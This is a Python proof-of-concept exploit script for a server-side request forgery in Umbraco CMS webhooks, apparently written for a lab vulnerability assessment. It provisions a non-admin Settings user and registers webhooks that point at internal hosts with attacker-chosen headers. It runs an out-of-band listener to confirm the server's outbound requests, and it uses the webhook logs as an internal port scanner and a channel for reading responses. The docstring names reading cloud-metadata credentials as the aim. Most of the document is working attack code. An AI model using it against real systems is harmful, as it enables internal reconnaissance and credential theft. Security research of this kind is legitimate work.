#!/usr/bin/env python3
"""
VULN-006 — Server-Side Request Forgery via webhook target URL
           (blind port/host oracle by default; full response read with Hosting:Debug=true)

Vulnerable code (targets/Umbraco-CMS):
  * src/Umbraco.Core/Services/WebhookService.cs:37-45  ValidateWebhook — checks ONLY
        `webhook.Events.Length`; the URL is never inspected (no scheme/host/IP allow-list).
        This is the sole validation on CreateAsync (:48-73) and UpdateAsync (:76-...).
  * src/Umbraco.Cms.Api.Management/ViewModels/Webhook/WebhookModelBase.cs:28-29 — `Url`
        is only `[Required]`; no FluentValidator for it exists.
  * src/Umbraco.Infrastructure/BackgroundJobs/Jobs/DistributedJobs/WebhookFiring.cs:110-137 —
        the firing job POSTs to the raw stored `webhook.Url` (:114) with attacker-chosen
        `webhook.Headers` (:128-131) via `httpClient.SendAsync` (:137).
  * src/Umbraco.Web.Common/DependencyInjection/UmbracoBuilderExtensions.cs:257-261 — the
        "WebhookFiring" named HttpClient sets only a User-Agent and does NOT
        ConfigurePrimaryHttpMessageHandler, so HttpClientHandler.AllowAutoRedirect keeps its
        default `true` (a 302 to an internal/metadata host is followed, un-revalidated).

Class: Server-Side Request Forgery (CWE-918).

Flaw (plain English):
  A backoffice user with the Settings section (policy TreeAccessWebhooks — admin by default,
  delegable to a non-admin Settings group) registers a webhook whose target URL is an arbitrary
  internal / loopback / cloud-metadata address. Nothing validates the URL's scheme, host or IP.
  On the next subscribed event (webhooks are ENABLED by default, fire every 10s) the server issues
  a POST to that URL, following redirects and sending attacker-controlled headers. The webhook log
  is a blind port/host oracle (statusCode / isSuccessStatusCode / exception) even without debug; with
  Umbraco:CMS:Hosting:Debug=true (this lab) it returns the full response body + headers — the primitive
  used to read cloud-instance metadata (IMDS credentials) or internal-only HTTP services.

Exploitation idea:
  Stand up an out-of-band (OOB) HTTP listener on the host, bound to 0.0.0.0:<rnd>. From the app
  container the host is reachable at the docker bridge gateway (172.18.0.1). Register a webhook whose
  URL points at http://<gateway>:<port>/canary-<rnd> with a custom header, subscribe it to
  Umbraco.ContentPublish, then publish a document. Prove the server itself connected OUT to our
  attacker-chosen host:port (the listener records a request from the container IP carrying our custom
  header) — that is SSRF. Also show the log oracle: the successful attempt's status differs from a
  closed internal port, and Debug=true echoes the full captured response body/headers.

A successful run proves: an authenticated Settings-tier user made the Umbraco server originate an HTTP
request to an operator-unintended internal address with attacker headers, and read the response back —
a complete SSRF (blind by default, full-read with Debug).
"""
import json
import os
import socket
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import _common as c
import _resilient as rc

VID = "VULN-006"
HERE = os.path.dirname(__file__)
GATEWAY = os.environ.get("DOCKER_GATEWAY", "172.18.0.1")  # `docker network inspect ..._default` -> gateway

_HITS = []
_LOCK = threading.Lock()


def _free_port() -> int:
    s = socket.socket()
    s.bind(("0.0.0.0", 0))
    p = s.getsockname()[1]
    s.close()
    return p


class _Canary(BaseHTTPRequestHandler):
    def _record(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length) if length else b""
        with _LOCK:
            _HITS.append({
                "method": self.command,
                "path": self.path,
                "from_client_ip": self.client_address[0],
                "user_agent": self.headers.get("User-Agent"),
                "umb_event": self.headers.get("Umb-Webhook-Event"),
                "x_canary": self.headers.get("X-Canary"),
                "body": body[:400].decode("utf-8", "replace"),
            })
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"oob":"canary-hit","secret":"internal-service-only"}')

    def do_POST(self):
        self._record()

    def do_GET(self):
        self._record()

    def log_message(self, *a):  # keep run.log clean
        return


def _settings_user(admin: c.ApiClient):
    """Provision a NON-admin user in a Settings-only group (to demonstrate PR:H delegation).
    Falls back to the admin client if provisioning is unavailable."""
    try:
        gid = c.create_group_with_start_node(admin, ["Umb.Section.Settings"], has_doc_root=False,
                                              name=f"settingsgrp_{c.rnd(3)}")
        pw = f"Settings_{c.rnd(6)}!aA1"
        u = c.create_user(admin, [gid])
        c.set_password_for_user(admin, u["id"], pw)
        client = rc.login(u["email"], pw, label="settings-user")
        # verify the Settings user can actually reach the webhook API (the real authz gate)
        probe = client.get("/webhook?skip=0&take=1")
        if probe.status_code == 200:
            c.log("SETUP", f"provisioned NON-admin Settings user {u['email']} (policy TreeAccessWebhooks OK)")
            return client, u["email"]
        c.log("INFO", f"Settings user cannot reach /webhook (HTTP {probe.status_code}); using admin instead")
    except Exception as e:
        c.log("INFO", f"Settings-user provisioning failed ({e}); using admin instead")
    return admin, c.ADMIN_USER


def main() -> int:
    c.banner(VID, "SSRF via unvalidated webhook target URL (OOB confirmed; full-read via Debug)",
             "WebhookService.cs:37-45 (no URL validation) -> WebhookFiring.cs:112-137 (POST raw URL, attacker headers)")

    admin = rc.resilient_admin_client()
    c.log("SETUP", "admin authenticated to Management API")
    actor, actor_name = _settings_user(admin)

    # ---- OOB listener on the host (our own controlled canary) ----
    port = _free_port()
    srv = ThreadingHTTPServer(("0.0.0.0", port), _Canary)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    canary = c.rnd(6)
    target = f"http://{GATEWAY}:{port}/canary-{canary}"
    c.log("SETUP", f"OOB listener bound 0.0.0.0:{port}; container-reachable target = {target}")

    # a closed internal port to demonstrate the blind port oracle (open vs closed)
    closed_port = _free_port()  # nothing listens here
    closed_target = f"http://{GATEWAY}:{closed_port}/closed-{canary}"

    ok = True
    created_keys = []
    try:
        # ---- content to publish (the trigger for Umbraco.ContentPublish) ----
        dt = c.create_doctype(admin)
        doc = c.create_document(admin, dt["id"], f"WebhookTrigger {c.rnd(2)}", dt["propAlias"], "trigger-body")
        c.log("SETUP", f"created a document {doc} to publish (fires the webhook event)")

        # ---- register the SSRF webhook as the Settings-tier user (NO url validation) ----
        wh_open = {"url": target, "enabled": True, "events": ["Umbraco.ContentPublish"],
                   "headers": {"X-Canary": canary, "X-Attacker": "ssrf"}, "name": f"ssrf-open-{canary}"}
        r_open = actor.post("/webhook", json=wh_open)
        c.log("STEP", f"POST /webhook (target={target}) as {actor_name} -> {r_open.status_code} "
                      f"(internal/loopback URL accepted with NO scheme/host/IP validation)")
        if r_open.status_code not in (200, 201):
            c.log("FAIL", f"webhook create rejected: {r_open.status_code} {r_open.text[:200]}")
            ok = False
        else:
            created_keys.append(r_open.headers.get("Location", "").rstrip("/").split("/")[-1])

        wh_closed = {"url": closed_target, "enabled": True, "events": ["Umbraco.ContentPublish"],
                     "headers": {"X-Canary": canary}, "name": f"ssrf-closed-{canary}"}
        r_closed = actor.post("/webhook", json=wh_closed)
        if r_closed.status_code in (200, 201):
            created_keys.append(r_closed.headers.get("Location", "").rstrip("/").split("/")[-1])

        # ---- trigger: publish the document -> Umbraco.ContentPublish fires within ~10s ----
        r_pub = admin.put(f"/document/{doc}/publish", json={"publishSchedules": [{"culture": None, "schedule": None}]})
        c.log("STEP", f"PUT /document/{{id}}/publish -> {r_pub.status_code} (raises Umbraco.ContentPublish)")

        # ---- wait for the server to connect OUT to our listener ----
        c.log("STEP", "waiting for the server to originate the outbound request (webhook period = 10s)...")
        deadline = time.time() + 70
        while time.time() < deadline and not _HITS:
            time.sleep(2)

        hit = _HITS[0] if _HITS else None
        if hit and hit.get("x_canary") == canary and hit.get("from_client_ip"):
            c.log("PROOF", f"OOB listener received a {hit['method']} from the app container "
                           f"({hit['from_client_ip']}) to {hit['path']}")
            c.log("PROOF", f"the request carried our attacker header X-Canary={hit['x_canary']} and "
                           f"User-Agent={hit['user_agent']!r} (server-originated = SSRF)")
        else:
            c.log("FAIL", f"no OOB hit received within timeout; hits={_HITS}")
            ok = False

        # ---- the log oracle (blind by default; full body+headers with Hosting:Debug=true) ----
        # logs are written asynchronously after each attempt; poll until both targets appear
        open_log = closed_log = None
        log_deadline = time.time() + 50
        while time.time() < log_deadline and (open_log is None or closed_log is None):
            logs = admin.get("/webhook/logs?skip=0&take=100")  # RClient auto-reauths on 401
            if logs.status_code == 200:
                for it in logs.json().get("items", []):
                    u = it.get("url", "")
                    if u == target and open_log is None:
                        open_log = it
                    elif u == closed_target and closed_log is None:
                        closed_log = it
            if open_log is None or closed_log is None:
                time.sleep(4)
        if open_log:
            c.log("PROOF", f"blind oracle — OPEN internal port logged: statusCode={open_log.get('statusCode')} "
                           f"isSuccess={open_log.get('isSuccessStatusCode')}")
            if open_log.get("responseBody"):
                c.log("PROOF", f"Hosting:Debug=true leaked the FULL response body from the internal target: "
                               f"{open_log.get('responseBody')!r} (this is the IMDS/secret-read primitive)")
        if closed_log:
            c.log("PROOF", f"blind oracle — CLOSED internal port logged: statusCode={closed_log.get('statusCode')} "
                           f"exceptionOccured={closed_log.get('exceptionOccured')} "
                           f"(open vs closed differ => internal port scanner)")

        # ---- persist evidence ----
        with open(os.path.join(HERE, "evidence", "oob_listener.log"), "w") as f:
            f.write(json.dumps(_HITS, indent=2) + "\n")
        with open(os.path.join(HERE, "evidence", "webhook_logs.json"), "w") as f:
            f.write(json.dumps({"open": open_log, "closed": closed_log}, indent=2, default=str) + "\n")
        with open(os.path.join(HERE, "request.http"), "w") as f:
            f.write("### The webhook registration (as a Settings-section user) — no URL validation\n")
            f.write(f"POST {c.MGMT}/webhook HTTP/1.1\nAuthorization: Bearer <settings-user-token>\n"
                    f"Content-Type: application/json\n\n{json.dumps(wh_open)}\n\n")
            f.write("### Trigger\n")
            f.write(f"PUT {c.MGMT}/document/{doc}/publish HTTP/1.1\nAuthorization: Bearer <admin-token>\n\n"
                    '{"publishSchedules":[{"culture":null,"schedule":null}]}\n\n')
            f.write("### The request the SERVER then originated to our attacker host (captured by the listener):\n")
            if hit:
                f.write(f"{hit['method']} {hit['path']} HTTP/1.1\nHost: {GATEWAY}:{port}\n"
                        f"User-Agent: {hit['user_agent']}\nUmb-Webhook-Event: {hit['umb_event']}\n"
                        f"X-Canary: {hit['x_canary']}\n\n{hit['body']}\n")
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write(f"OOB listener (host 0.0.0.0:{port}) captured hit(s):\n{json.dumps(_HITS, indent=2)}\n\n")
            f.write(f"webhook log (OPEN target {target}):\n{json.dumps(open_log, indent=2, default=str)}\n\n")
            f.write(f"webhook log (CLOSED target {closed_target}):\n{json.dumps(closed_log, indent=2, default=str)}\n")
    finally:
        # cleanup: delete the webhooks we created so they stop firing / logging
        for k in created_keys:
            if k:
                try:
                    actor.delete(f"/webhook/{k}")
                except Exception:
                    pass
        srv.shutdown()

    if ok:
        return c.verdict(VID, "CONFIRMED",
                         "server originated an HTTP request to our attacker-chosen internal host with attacker headers; "
                         "Debug=true leaked the full response body = SSRF")
    return c.verdict(VID, "FAILED", "could not observe the server-originated OOB request")


if __name__ == "__main__":
    sys.exit(main())
